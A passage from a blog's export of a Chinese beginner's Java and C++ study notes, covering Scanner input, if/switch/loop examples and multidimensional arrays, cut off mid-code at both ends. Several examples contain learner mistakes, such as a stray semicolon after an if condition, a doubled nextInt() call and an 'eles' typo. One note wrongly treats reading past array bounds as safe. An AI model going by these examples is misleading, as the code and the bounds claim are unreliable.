class="comment">//凡是始于IO流的类如果不关闭会一直占用资源，要养成好习惯用完就关掉。</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calss2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用nextLine方式接收：&quot;</span>);</span><br><span class="line">        <span class="comment">//关闭程序的语句</span></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNextLine())&#123;<span class="comment">//调用呐呐呐</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();<span class="comment">//等待语句运行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容为：&quot;</span>+str);<span class="comment">//输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();<span class="comment">//关闭程序的语句</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li><p>next()</p>
<ol>
<li>一定要读取到有效字符后才可以结束输出</li>
<li>对输入有效值字符之前遇到的恐怖，next()方法会自动将其去掉。</li>
<li>只有输入有效字符后才将其后面输入的恐怖作为分隔符或者结束符。</li>
<li>next() 不能得到带有空格的字符串。</li>
</ol>
</li>
<li><p>nextLine()</p>
<ol>
<li>以Enter为结束符，也就说nextLine（）方法是返回输入回车之前的所有字符。</li>
<li>可以获得空白。</li>
</ol>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calss3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入数据：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;输出的内容为:&quot;</span>+str);</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.security.sasl.SaslClient;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">0.0f</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNextInt())&#123;</span><br><span class="line">           i = scanner.nextInt();</span><br><span class="line">            System.out.println(<span class="string">&quot;整数数据：&quot;</span>+i);&#125;<span class="keyword">else</span> &#123; <span class="comment">//检测i是不是int类型，如果返回为false就走了else，如果不是就继续向下走</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是整数数据&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入小数：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNextFloat())&#123;</span><br><span class="line">            f = scanner.nextFloat();</span><br><span class="line">            System.out.println(<span class="string">&quot;小数数据：&quot;</span>+f);&#125;<span class="keyword">else</span> &#123; <span class="comment">//检测i是不是float类型，如果返回为false就走了else，如果不是就继续向下走</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是小数数据&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 初学时旧笔记</title>
    <url>/2022/07/23/2022-7-23-C++-%E5%88%9D%E5%AD%A6%E6%97%B6%E6%97%A7%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">第一行代码</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream &gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="C-的集成环境-《Code-blocks》"><a href="#C-的集成环境-《Code-blocks》" class="headerlink" title="C++的集成环境  《Code blocks》"></a>C++的集成环境  《Code blocks》</h2><h3 id="codeblocks可以使用MINGW作为编译器-下载地址：https-sourceforge-net-projects-mingw-w64-MinGW内置了python-java-等-各种语言的编译器，以及调试器，只需要配置到codeblocks之中使用即可"><a href="#codeblocks可以使用MINGW作为编译器-下载地址：https-sourceforge-net-projects-mingw-w64-MinGW内置了python-java-等-各种语言的编译器，以及调试器，只需要配置到codeblocks之中使用即可" class="headerlink" title="codeblocks可以使用MINGW作为编译器  下载地址：https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;mingw-w64&#x2F;   MinGW内置了python java 等..各种语言的编译器，以及调试器，只需要配置到codeblocks之中使用即可,"></a>codeblocks可以使用MINGW作为编译器  下载地址：https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;mingw-w64&#x2F;   MinGW内置了python java 等..各种语言的编译器，以及调试器，只需要配置到codeblocks之中使用即可,</h3><p>c++的难点：多维数组
7月24日
 例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string letters[<span class="number">2</span>][<span class="number">2</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">&#123;</span><br><span class="line">&#123; <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span> &#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123; <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>[]的数量代表着这个数组是几维
 []内部代表着维度的数量，由大块向小块去看
 怎么叫做由大块向小块去看?
 此代码中，ABCD是一个大块，是第一维的
 AB和CD又被分为二维的两个小块
 A和B，又被第三维再分
 如此理解数组的概念
 此外，数组还有一条特殊的性质，叫做空间的连续性
 举例：[0][0][2]可以得到C 原因是，数组超出了原本的空间，但是由于空间是一条带状的连续的，可以访问到其他空间里面的元素。
 不仅如此，如果超出空间的部分是一片空白的内存，只要不超出太多也是可以访问的，因为系统给程序分配的内存往往比实际上大很多。
 而通过空间连续去修改内存也是病毒的特征之一。</p>
<h5 id="C-学习的第三天，7-25-关于面向对象（OOP）"><a href="#C-学习的第三天，7-25-关于面向对象（OOP）" class="headerlink" title="C++学习的第三天，7.25      关于面向对象（OOP）"></a>C++学习的第三天，7.25      关于面向对象（OOP）</h5><p>首先我们需要清楚类是什么       </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;      </span><br><span class="line">    <span class="comment">// The class     public:            \ </span></span><br><span class="line">    <span class="comment">// Access specifier       int myNum;        			// Attribute (int variable)       string myString;  </span></span><br><span class="line">    <span class="comment">// Attribute (string variable)    &#125;;          </span></span><br></pre></td></tr></table></figure>



<p>这是我们创建的一个类，类内部拥有自己的属性，以及访问说明符（public）     MyClass myObj;      而类可以以这种形式给对象使用，在这里myObj就是我们的对象，这个对象属于这个分类。     而分类后，对象可以使用自己分类的属性了，并且可以为自己的各项属性赋值。</p>
<h6 id="C-学习的第四天-7-26-对此前笔记的整理"><a href="#C-学习的第四天-7-26-对此前笔记的整理" class="headerlink" title="C++学习的第四天 7.26 对此前笔记的整理"></a>C++学习的第四天 7.26 对此前笔记的整理</h6><p>#include <iostream>  &#x2F;&#x2F;而这里，是C++头文件，头文件中包含了大量的信息，   using namespace std;  &#x2F;&#x2F; main() 是程序开始执行的地方   int main()  &#x2F;&#x2F;每个程序都从这里开始执行，这里是主程序，每个程序最主要的部分。  {     cout &lt;&lt; “Hello World”; &#x2F;&#x2F; 输出 Hello World     return 0;      &#x2F;&#x2F;返回一个0的值，在这里起到终止函数的作用                       &#x2F;&#x2F;花括号内，是运行的函数体，   }       如何去跑一段C++代码？   答案是，先编译，再运行！   我们在编写的文件为cpp文件，首先将cpp文件进行构建为exe文件，再进行运行。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVASE_2</title>
    <url>/2022/08/01/2022-8-1-%E8%BF%99%E6%98%AF%E7%88%B7%E7%9A%84%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<ol>
<li>通过函数访问到Scanner.java  （xxx.java）</li>
<li>通过左侧Structure 查看方法列表</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//我们可以输入多个数字，并求其总和与平均数，每输入一个数字用回车确认，通过输入非数字结束输入并输出执行结果。</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="comment">//和</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 计算输入了多少个数字</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="comment">//通过循环判断是否还有输入，并在里面对每一次进行求和统计</span></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextDouble())&#123;  <span class="comment">//whisle使用上感觉和if差不多，最重要的是理解java的程序结构</span></span><br><span class="line">            <span class="type">Double</span> <span class="variable">x</span> <span class="operator">=</span>scanner.nextDouble(); <span class="comment">//这条语句给x进行赋值，x是一个变量</span></span><br><span class="line">            System.out.println(<span class="string">&quot;你输入的x为：&quot;</span>+x);<span class="comment">//这里可以输出x的值，，而出了这个&#123;&#125;就不可以再输出x的值了</span></span><br><span class="line">            m = m +<span class="number">1</span>;<span class="comment">//可以写为m++</span></span><br><span class="line">            sum = sum + x; <span class="comment">//在这里将x的值加入到sum中</span></span><br><span class="line">            System.out.println(<span class="string">&quot;你输入了第&quot;</span>+m+<span class="string">&quot;个数据，&quot;</span>+<span class="string">&quot;当前结果为：&quot;</span>+sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println((double)x);//会导致出现报错，找不到符号，因为离开了上面的语句后x的没有得到赋值了</span></span><br><span class="line">        System.out.println(<span class="string">&quot;输入数字的和为&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;一共输入了&quot;</span>+m+<span class="string">&quot;个数字&quot;</span>);</span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数字的平均值为&quot;</span>+(sum/m));</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><ul>
<li><strong>JAVA的基本结构就是顺序结构，除非特别指明，否则就按照顺序一句一句执行。</strong></li>
<li>顺序结构是最简单那的算法结构</li>
<li>语句与语句之间，框与框之间是按照从上到下的顺序进行的，它是由若干个依次执行的处理步骤组成的，它是任何一共算法都离不开的一种基本算法结构。</li>
</ul>
<h2 id="if-单选择结构"><a href="#if-单选择结构" class="headerlink" title="if 单选择结构"></a>if 单选择结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package if233;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;   //if 单选择结构，表达式成立为true则输出再end</span><br><span class="line"></span><br><span class="line">public class class1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Scanner scanner = new Scanner(System.in);</span><br><span class="line">        System.out.println(&quot;请输入内容:&quot;);</span><br><span class="line">        String s = scanner.nextLine();</span><br><span class="line">        //s.equals:判断字符串是否相等</span><br><span class="line">        if (s.equals(&quot;Hello&quot;));&#123;//判断s和Hello这俩字符串是否相等捏</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        &#125; //不成立则直接End然后结束</span><br><span class="line">        System.out.println(&quot;End&quot;);</span><br><span class="line">        scanner.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="if-双选择结构"><a href="#if-双选择结构" class="headerlink" title="if 双选择结构"></a>if 双选择结构</h2><ul>
<li><p><strong>语法</strong></p>
</li>
<li><pre><code class="java">if (布尔表达式)&#123;
    //如果布尔表达式的值为true
&#125;else&#123;
    //如果布尔表达式的值为false
&#125;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 实例\\</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<h2 id="if多选择结构"><a href="#if多选择结构" class="headerlink" title="if多选择结构"></a>if多选择结构</h2><p><strong>语法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式 <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="comment">//如果布尔表达式 1的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">2</span>)&#123;</span><br><span class="line">	<span class="comment">//如果布尔表达式 2的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">3</span>)&#123;</span><br><span class="line">	<span class="comment">//如果布尔表达式 3的值为true执行代码</span></span><br><span class="line">&#125;eles&#123;</span><br><span class="line">    <span class="comment">//如果以上布尔表达式都不为true执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F;我日昨天的笔记没保存，呜呜呜呜呜呜呜呜呜</p>
<h1 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="comment">//考试分数&gt;60就是及格  &lt;60就是不及格</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩：&quot;</span>);</span><br><span class="line">        scanner.nextInt();<span class="comment">//等待用户输入一个Int</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> scanner.nextInt(); <span class="comment">//将输入的给score, score 等于 scanner.next里的int.</span></span><br><span class="line">        <span class="keyword">if</span> (score&gt;<span class="number">60</span>) &#123;<span class="comment">//如果score&gt;60则就执行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">//如果不大于就走这个</span></span><br><span class="line">            System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class3</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if 语句至多有1一个else语句，else语句在所有的else if语句之后。</span></span><br><span class="line"><span class="comment">    if 语句可以有若干个else if 语句，他们必须在else语句之前。</span></span><br><span class="line"><span class="comment">    一旦其中一个 else if 语句检测为true,其他的else if 以及 else 语句都将跳过执行。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩：&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (score==<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;恭喜满分！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;=<span class="number">90</span> &amp;&amp; score&lt;<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;=<span class="number">80</span> &amp;&amp; score&lt;<span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;=<span class="number">70</span> &amp;&amp; score&lt;<span class="number">80</span>)&#123;<span class="comment">//会根据语句的先后执行，越靠前优先级越大</span></span><br><span class="line">            System.out.println(<span class="string">&quot;不戳&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;=<span class="number">60</span> &amp;&amp; score&lt;=<span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;海星&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;=<span class="number">100</span> ) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;开挂狗给爷爬&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;菜逼&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="comment">//考试分数&gt;60就是及格  &lt;60就是不及格</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩：&quot;</span>);</span><br><span class="line">        scanner.nextInt();<span class="comment">//等待用户输入一个Int</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> scanner.nextInt(); <span class="comment">//将输入的给score, score 等于 scanner.next里的int.</span></span><br><span class="line">        <span class="keyword">if</span> (score&gt;<span class="number">60</span>) &#123;<span class="comment">//如果score&gt;60则就执行</span></span><br><span class="line">            System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">//如果不大于就走这个</span></span><br><span class="line">            System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">//Scanner scanner = new Scanner(System.in);</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">grade</span> <span class="operator">=</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (grade)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">//表示可选 ，如果没有break会出现case 穿透现象！如果没有匹配成功会一口气输出到最后。</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;海星&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;森么彩笔？&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;请不要搞事嗷！&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">class6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;牛逼&quot;</span>;</span><br><span class="line">        <span class="comment">//JDK7新特性，表达式结果可以是字符串！！！</span></span><br><span class="line">        <span class="comment">//字符串本质还是数字捏</span></span><br><span class="line">        <span class="comment">//反编译 java---class(字节码文件)---反编译（IDEA）</span></span><br><span class="line">        <span class="keyword">switch</span> (name)&#123;<span class="comment">//将字符串name与各个对比</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;牛逼&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;卧槽果然牛逼！&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//防止穿透</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;笑死&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;笑死我了什么垃圾&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;呵呵给爷爬！&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhile1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum = sum + i;</span><br><span class="line">            i ++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(i&lt;<span class="number">100</span>);</span><br><span class="line">        System.out.println(sum);<span class="comment">//输出4950</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhile2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (a&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a++;</span><br><span class="line">        &#125;<span class="keyword">while</span> (a&lt;<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Do-while-如上"><a href="#Do-while-如上" class="headerlink" title="Do while 如上"></a>Do while 如上</h2><hr>
<h1 id="while-循环-和-for-的对比"><a href="#while-循环-和-for-的对比" class="headerlink" title="while 循环 和 for 的对比"></a>while 循环 和 for 的对比</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> if233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">For1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;<span class="comment">//初始化条件</span></span><br><span class="line">        <span class="keyword">while</span> (a&lt;=<span class="number">100</span>)&#123;<span class="comment">//条件判断</span></span><br><span class="line">            System.out.println(a);<span class="comment">//循环体</span></span><br><span class="line">            a+=<span class="number">2</span>;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;循环结束&quot;</span>);</span><br><span class="line">        <span class="comment">//初始化//条件判断//迭代</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;for循环结束&quot;</span>);</span><br><span class="line">        <span 